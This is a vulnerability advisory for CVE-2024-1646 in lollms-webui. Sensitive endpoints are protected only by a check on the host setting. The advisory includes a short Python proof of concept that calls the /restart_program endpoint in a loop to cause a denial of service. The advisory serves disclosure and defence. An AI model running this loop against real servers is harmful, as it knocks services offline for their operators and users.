---
description: CVE-2024-1646, HIGH, Exposed endpoints in lollms-webui leads to denial of service
title: lollms-webui exposued endpoints DoS
date_published: "2024-04-15"
last_updated: "2024-04-15"
xray_id: JFSA-2024-001028815
vul_id: CVE-2024-1646
cvss: 8.2
severity: high
discovered_by: Naveh Racovsky
type: vulnerability

---

## Summary

Exposed endpoints in lollms-webui leads to denial of service

## Component

[parisneo/lollms-webui](https://github.com/parisneo/lollms-webui)

## Affected versions

(,9.2], Fixed in 9.3

## Description

Multiple sensitive endpoints are not well-protected from access by outside actors. The current protection checks whether the host parameter isn't `0.0.0.0`.

```python
if lollmsElfServer.config.host=="0.0.0.0"
```

However, the application may be run exposed to a specific interface, in which case this check will be insufficient. 

## PoC

```bash
// PoC.py
import requests
from time import sleep
IP_ADDRESS = "aaa.bbb.ccc.ddd" #Change this to the address of the chosen interface
PORT = 9600

while True:
    try:
        response = requests.get(f"http://{IP_ADDRESS}:{str(PORT)}/restart_program")
        print(response.json())
    except Exception:
        pass
    sleep(1)
```



## Vulnerability Mitigations

No mitigations are supplied for this issue

## References

[Advisory](https://huntr.com/bounties/2f769c46-aa85-4ab8-8b08-fe791313b7ba)

